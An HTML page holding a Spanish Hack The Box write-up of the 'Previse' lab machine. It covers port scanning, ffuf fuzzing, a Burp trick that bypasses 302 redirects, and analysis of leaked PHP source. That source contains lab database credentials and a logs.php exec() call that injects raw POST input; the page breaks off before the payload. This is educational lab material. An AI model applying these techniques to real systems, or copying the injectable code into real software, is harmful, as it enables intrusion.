@@ -1,0 +1,529 @@
+<!doctype html><html lang=es>
+<head>
+<title>Previse | 7Rocky</title>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
+<meta name=viewport content="width=device-width,minimum-scale=1">
+<meta name=description content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web vulnerable a inyección de comandos después de burlar redirecciones y conseguir registrar una nueva cuenta. Después, hay que romper un hash para acceder como usuario de bajos privilegios y realizar PATH hijacking mediante sudo. Para comprometer esta máquina se necesitan conocimientos básicos de pentesting web y Burp Suite, así como técnicas de escalada de privilegios comunes. En este write-up se utiliza un programa en Go personalizado para automatizar la intrusión">
+<meta name=robots content="index, follow">
+<meta name=image content="https://7rocky.github.io/images/HTB/Previse/Previse.png">
+<meta name=author content="7Rocky">
+<meta property="og:title" content="Previse">
+<meta property="og:description" content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web vulnerable a inyección de comandos después de burlar redirecciones y conseguir registrar una nueva cuenta. Después, hay que romper un hash para acceder como usuario de bajos privilegios y realizar PATH hijacking mediante sudo. Para comprometer esta máquina se necesitan conocimientos básicos de pentesting web y Burp Suite, así como técnicas de escalada de privilegios comunes. En este write-up se utiliza un programa en Go personalizado para automatizar la intrusión">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7rocky.github.io/htb/previse/"><meta property="article:section" content="htb">
+<meta property="article:published_time" content="2021-01-08T00:00:00+01:00">
+<meta property="article:modified_time" content="2021-01-08T00:00:00+01:00"><meta property="og:site_name" content="7Rocky">
+<meta property="og:image" content="https://7rocky.github.io/images/HTB/Previse/Previse.png">
+<meta property="og:author" content="7Rocky">
+<meta itemprop=name content="Previse">
+<meta itemprop=description content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web vulnerable a inyección de comandos después de burlar redirecciones y conseguir registrar una nueva cuenta. Después, hay que romper un hash para acceder como usuario de bajos privilegios y realizar PATH hijacking mediante sudo. Para comprometer esta máquina se necesitan conocimientos básicos de pentesting web y Burp Suite, así como técnicas de escalada de privilegios comunes. En este write-up se utiliza un programa en Go personalizado para automatizar la intrusión"><meta itemprop=datePublished content="2021-01-08T00:00:00+01:00">
+<meta itemprop=dateModified content="2021-01-08T00:00:00+01:00">
+<meta itemprop=wordCount content="1713">
+<meta itemprop=keywords content="php,sudo,path-hijacking,command-injection,rce,hash-cracking,">
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="Previse">
+<meta name=twitter:description content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web vulnerable a inyección de comandos después de burlar redirecciones y conseguir registrar una nueva cuenta. Después, hay que romper un hash para acceder como usuario de bajos privilegios y realizar PATH hijacking mediante sudo. Para comprometer esta máquina se necesitan conocimientos básicos de pentesting web y Burp Suite, así como técnicas de escalada de privilegios comunes. En este write-up se utiliza un programa en Go personalizado para automatizar la intrusión">
+<meta name=twitter:image content="https://7rocky.github.io/images/HTB/Previse/Previse.png">
+<meta name=twitter:author content="7Rocky">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-Z1HQGH3M4D',{anonymize_ip:!1})}</script>
+<link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon>
+<link href=/css/style.css rel=stylesheet>
+<link href=/css/monokai-sublime.min.css rel=stylesheet>
+<link href=/css/code.css rel=stylesheet>
+<link href=/css/main.css rel=stylesheet>
+<script src=/js/highlight.min.js></script>
+<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script>
+<script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script>
+<script src=/js/main.js></script>
+<div style=display:none>
+$
+\newcommand{\e}{e}
+\newcommand{\N}[1][]{\mathbb{N}^{#1}}
+\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
+\newcommand{\R}[1][]{\mathbb{R}^{#1}}
+\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
+\newcommand{\C}[1][]{\mathbb{C}^{#1}}
+\newcommand{\dx}{\,\mathrm{d}x}
+\newcommand{\dy}{\,\mathrm{d}y}
+\newcommand{\dz}{\,\mathrm{d}z}
+\newcommand{\dt}{\,\mathrm{d}t}
+\newcommand{\divides}{\, | \,}
+\newcommand{\st}{\; | \;}
+\renewcommand{\geq}{\geqslant}
+\renewcommand{\leq}{\leqslant}
+\renewcommand{\i}{\mathrm{i}}
+\newcommand{\rank}{\mathop{\mathrm{rank}}}
+\newcommand{\tr}{\mathop{\mathrm{tr}}}
+\newcommand{\charField}{\mathop{\mathrm{char}}}
+\newcommand{\Image}{\mathop{\mathrm{Im}}}
+$
+</div>
+</head>
+<body class="ma0 production">
+<header>
+<div class=bg-black>
+<nav class="pv3 ph3 ph4-ns" role=navigation>
+<div class="flex-l justify-between items-center center">
+<a class="f3 fw2 hover-white no-underline white-90 dib" href=/ title=7Rocky>7Rocky</a>
+<div class="flex-l items-center">
+<a class="link-transition github link dib z-999 pt3 pt0-l mr3" href=/en/htb/previse/ title=en>
+<img alt=en height=32px src=/images/en.png width=32px>
+</a>
+<ul class="pl0 ml3 mr3">
+<li class="list f5 f4-ns fw4 dib pr3">
+<a class="hover-white no-underline white-90" href=/ctf/ title=CTF>CTF</a>
+</li>
+<li class="list f5 f4-ns fw4 dib pr3">
+<a class="hover-white no-underline white-90" href=/htb/ title=HTB>HTB</a>
+</li>
+<li class="list f5 f4-ns fw4 dib pr3">
+<a class="hover-white no-underline white-90" href=/imc/ title=IMC>IMC</a>
+</li>
+</ul>
+<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span>
+</a>
+<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span>
+</a>
+</div>
+</div>
+</nav>
+</div>
+</header>
+<main class=pb7 role=main>
+<article class="flex-l flex-wrap justify-between mw8 center ph3">
+<header class="mt4 w-100">
+<aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HTB</aside>
+<div id=sharing class=mt3>
+<a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/previse/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
+</a>
+<a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/previse/&text=Previse" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</a>
+<a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/previse/&title=Previse" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</a>
+</div>
+<h1 class="f1 mt3 mb1">Previse</h1>
+<time class="f6 mv4 dib tracked" datetime=2021-01-08T00:00:00+01:00>08 / 01 / 2021</time>
+</header>
+<div class=htb-image>
+<img alt=Previse src=/images/HTB/Previse/Previse.png>
+</div>
+<ul class="nested-links tags">
+<li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/php title=PHP>PHP</a>
+</li>
+<li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/sudo title=sudo>sudo</a>
+</li>
+<li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/path-hijacking title="PATH hijacking">PATH hijacking</a>
+</li>
+<li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/command-injection title="Inyección de Comandos">Inyección de Comandos</a>
+</li>
+<li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/rce title="Ejecución remota de comandos">Ejecución remota de comandos</a>
+</li>
+<li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/hash-cracking title="Descifrado de hashes de contraseñas">Descifrado de hashes de contraseñas</a>
+</li>
+</ul>
+<aside aria-label=aside class="w-20-l mt6-l aside-mobile">
+<div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
+<p class="f5 b mb3">Contenidos de este write-up</p>
+<nav id=TableOfContents>
+<ul>
+<li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li>
+<li><a href=#enumeración-web>Enumeración web</a></li>
+<li><a href=#registrando-una-nueva-cuenta>Registrando una nueva cuenta</a></li>
+<li><a href=#analizando-código-php>Analizando código PHP</a></li>
+<li><a href=#acceso-a-la-máquina>Acceso a la máquina</a></li>
+<li><a href=#movimiento-lateral-al-usuario-m4lwhere>Movimiento lateral al usuario <code>m4lwhere</code></a></li>
+<li><a href=#escalada-de-privilegios>Escalada de privilegios</a></li>
+</ul>
+</nav>
+</div>
+</aside>
+<div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul>
+<li>
+<strong>SO</strong>: Linux
+</li>
+<li>
+<strong>Dificultad</strong>: Fácil
+</li>
+<li>
+<strong>Dirección IP</strong>: 10.10.11.104
+</li>
+<li>
+<strong>Fecha</strong>: 07 / 08 / 2021
+</li>
+</ul>
+<h2 id=escaneo-de-puertos>Escaneo de puertos</h2>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.104 -p 22,80
+Nmap scan report for 10.10.11.104
+Host is up (0.047s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
+|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
+|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-title: Previse Login
+|_Requested resource was login.php
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done -- 1 IP address (1 host up) scanned in 58.91 seconds
+</code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).</p>
+<h2 id=enumeración-web>Enumeración web</h2>
+<p>Si vamos a <code>http://10.10.11.104</code>, el servidor nos redirige al formulario de inicio de sesión:</p>
+<p><img src=/images/HTB/Previse/Previse-login.png alt="Previse login"></p>
+<p>Vamos a aplicar <em>fuzzing</em> para enumerar más rutas. Podemos añadir extensiones <code>.php</code> por si acaso:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-green>ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.104/FUZZ -e .php
+index.php               [Status: <span class=code-blue>302</span>, Size: 2801, Words: 737, Lines: 72]
+download.php            [Status: <span class=code-blue>302</span>, Size: 0, Words: 1, Lines: 1]
+login.php               [Status: <span class=code-dark-green>200</span>, Size: 2224, Words: 486, Lines: 54]
+files.php               [Status: <span class=code-blue>302</span>, Size: 4914, Words: 1531, Lines: 113]
+header.php              [Status: <span class=code-dark-green>200</span>, Size: 980, Words: 183, Lines: 21]
+nav.php                 [Status: <span class=code-dark-green>200</span>, Size: 1248, Words: 462, Lines: 32]
+footer.php              [Status: <span class=code-dark-green>200</span>, Size: 217, Words: 10, Lines: 6]
+css                     [Status: <span class=code-blue>301</span>, Size: 310, Words: 20, Lines: 10]
+status.php              [Status: <span class=code-blue>302</span>, Size: 2968, Words: 749, Lines: 75]
+js                      [Status: <span class=code-blue>301</span>, Size: 309, Words: 20, Lines: 10]
+logout.php              [Status: <span class=code-blue>302</span>, Size: 0, Words: 1, Lines: 1]
+accounts.php            [Status: <span class=code-blue>302</span>, Size: 3994, Words: 1096, Lines: 94]
+config.php              [Status: <span class=code-dark-green>200</span>, Size: 0, Words: 1, Lines: 1]
+logs.php                [Status: <span class=code-blue>302</span>, Size: 0, Words: 1, Lines: 1]
+</code></pre></div>
+<p>Aquí vemos que hay muchos estados 302 (302 Found). Esto significa que el servidor está redirigiendo a <code>/login.php</code>. Podemos decirle a <code>ffuf</code> que siga las redirecciones con el parámetro <code>-r</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-green>ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.104/FUZZ -e .php -r
+index.php               [Status: <span class=code-dark-green>200</span>, Size: 2224, Words: 486, Lines: 54]
+download.php            [Status: <span class=code-dark-green>200</span>, Size: 2224, Words: 486, Lines: 54]
+login.php               [Status: <span class=code-dark-green>200</span>, Size: 2224, Words: 486, Lines: 54]
+files.php               [Status: <span class=code-dark-green>200</span>, Size: 2224, Words: 486, Lines: 54]
+header.php              [Status: <span class=code-dark-green>200</span>, Size: 980, Words: 183, Lines: 21]
+nav.php                 [Status: <span class=code-dark-green>200</span>, Size: 1248, Words: 462, Lines: 32]
+footer.php              [Status: <span class=code-dark-green>200</span>, Size: 217, Words: 10, Lines: 6]
+css                     [Status: <span class=code-dark-green>200</span>, Size: 939, Words: 61, Lines: 17]
+status.php              [Status: <span class=code-dark-green>200</span>, Size: 2224, Words: 486, Lines: 54]
+js                      [Status: <span class=code-dark-green>200</span>, Size: 1155, Words: 77, Lines: 18]
+logout.php              [Status: <span class=code-dark-green>200</span>, Size: 2224, Words: 486, Lines: 54]
+accounts.php            [Status: <span class=code-dark-green>200</span>, Size: 2224, Words: 486, Lines: 54]
+config.php              [Status: <span class=code-dark-green>200</span>, Size: 0, Words: 1, Lines: 1]
+logs.php                [Status: <span class=code-dark-green>200</span>, Size: 2224, Words: 486, Lines: 54]
+</code></pre></div>
+<p>Parece claro que el servidor está redirigiendo a <code>/login.php</code>. La clave aquí es que las respuestas con código 302 tienen cuerpo. Esto se puede ver claramente desde Burp Suite:</p>
+<p><img src=/images/HTB/Previse/Previse-burp.png alt="Previse burp"></p>
+<p>Si renderizamos el contenido de la respuesta, podemos ver la página desde Burp Suite. El servidor habría seguido la redirección debido al estado 302.</p>
+<p><img src=/images/HTB/Previse/Previse-index-burp.png alt="Previse burp index"></p>
+<h2 id=registrando-una-nueva-cuenta>Registrando una nueva cuenta</h2>
+<p>Utilizando Burp Suite, podemos interceptar peticiones y también respuestas. Podemos configurarlo para que modifique la respuesta automáticamente y que cambie el estado a 200 Ok, de manera que el navegador no siga las redirecciones. Para ello, tenemos que ir a <em>Proxy > Options > Match and Replace > Add</em> y poner la siguiente configuración:</p>
+<p><img src=/images/HTB/Previse/Previse-burp-match-replace.png alt="Previse burp config"></p>
+<p>Así, podemos ver el contenido de la página web e incluso registrar una cuenta en <code>/account.php</code>:</p>
+<p><img src=/images/HTB/Previse/Previse-accounts.png alt="Previse accounts"></p>
+<p>Una vez registrados, podemos iniciar sesión y olvidarnos ya de las redirecciones.</p>
+<h2 id=analizando-código-php>Analizando código PHP</h2>
+<p>Hay un archivo ZIP subido por el usuario <code>newguy</code>:</p>
+<p><img src=/images/HTB/Previse/Previse-files.png alt="Previse files"></p>
+<p>Este contiene una copia de seguridad del código PHP del servidor:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-green>unzip</span> siteBackup.zip
+
+<span class=code-cyan>$</span> <span class=code-dark-green>tree</span>
+.
+├── accounts.php
+├── config.php
+├── download.php
+├── file_logs.php
+├── files.php
+├── footer.php
+├── header.php
+├── index.php
+├── login.php
+├── logout.php
+├── logs.php
+├── nav.php
+├── siteBackup.zip
+└── status.php
+
+0 directories, 14 files
+</code></pre></div>
+<p>En el archivo <code>config.php</code> encontramos unas credenciales de MySQL:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>connectDB</span>() {
+    $host <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;localhost&#39;</span>;
+    $user <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;root&#39;</span>;
+    $passwd <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;mySQL_p@ssw0rd!:)&#39;</span>;
+    $db <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;previse&#39;</span>;
+    $mycon <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>mysqli</span>($host, $user, $passwd, $db);
+    <span style=color:#66d9ef>return</span> $mycon;
+}
+</code></pre></div><p>También vemos un método curioso de realizar el <em>hash</em> de las contraseñas en <code>login.php</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php>$users <span style=color:#f92672>=</span> $result<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fetch_assoc</span>();
+$passHash <span style=color:#f92672>=</span> $users[<span style=color:#e6db74>&#39;password&#39;</span>];
+<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>crypt</span>($password, <span style=color:#e6db74>&#39;$1$🧂llol$&#39;</span>) <span style=color:#f92672>==</span> $passHash) {
+    $result<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>free</span>();
+    $_SESSION[<span style=color:#e6db74>&#39;user&#39;</span>] <span style=color:#f92672>=</span> $users[<span style=color:#e6db74>&#39;username&#39;</span>];
+    $result <span style=color:#f92672>=</span> $db<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>($sql);
+    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>$result) {
+        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;Oops! Something went wrong, try again later!&#39;</span>;
+    }
+    $db<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>close</span>();
+    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Location: index.php&#39;</span>);
+} <span style=color:#66d9ef>else</span> {
+    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;&lt;div class=&#34;uk-alert-danger&#34;&gt;Invalid Username or Password&lt;/div&gt;&#39;</span>;
+}
+</code></pre></div><h2 id=acceso-a-la-máquina>Acceso a la máquina</h2>
+<p>Podemos también encontrar un archivo llamado <code>logs.php</code>, que ejecuta un <em>script</em> de Python utilizando una llamada de systema, con una entrada de usuario sin validación:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+
+<span style=color:#a6e22e>session_start</span>();
+<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_SESSION[<span style=color:#e6db74>&#39;user&#39;</span>])) {
+    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Location: login.php&#39;</span>);
+    <span style=color:#66d9ef>exit</span>;
+}
+
+<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>$_SERVER[<span style=color:#e6db74>&#39;REQUEST_METHOD&#39;</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;POST&#39;</span>) {
+    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Location: login.php&#39;</span>);
+    <span style=color:#66d9ef>exit</span>;
+}
+
+<span style=color:#75715e>/////////////////////////////////////////////////////////////////////////////////////
+</span><span style=color:#75715e>//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
+</span><span style=color:#75715e>/////////////////////////////////////////////////////////////////////////////////////
+</span><span style=color:#75715e></span>
+$output <span style=color:#f92672>=</span> <span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>&#34;/usr/bin/python /opt/scripts/log_process.py </span><span style=color:#e6db74>{</span>$_POST[<span style=color:#e6db74>&#39;delim&#39;</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>);
+<span style=color:#66d9ef>echo</span> $output;
+
+$filepath <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/var/www/out.log&#34;</span>;
+$filename <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;out.log&#34;</span>;    
+
+<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>file_exists</span>($filepath)) {
+    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Content-Description: File Transfer&#39;</span>);
+    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Content-Type: application/octet-stream&#39;</span>);
+    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Content-Disposition: attachment; filename=&#34;&#39;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>basename</span>($filepath)<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;&#34;&#39;</span>);
+    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Expires: 0&#39;</span>);
+    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Cache-Control: must-revalidate&#39;</span>);
+    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Pragma: public&#39;</span>);
+    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Content-Length: &#39;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>filesize</span>($filepath));
+    <span style=color:#a6e22e>ob_clean</span>(); <span style=color:#75715e>// Discard data in the output buffer
+</span><span style=color:#75715e></span>    <span style=color:#a6e22e>flush</span>(); <span style=color:#75715e>// Flush system headers
+</span><span style=color:#75715e></span>    <span style=color:#a6e22e>readfile</span>($filepath);
+    <span style=color:#66d9ef>die</span>();
+} <span style=color:#66d9ef>else</span> {
+    <span style=color:#a6e22e>http_response_code</span>(<span style=color:#ae81ff>404</span>);
+    <span style=color:#66d9ef>die</span>();
+} 
+</code></pre></div><p>La línea de código vulnerable es esta:</p>
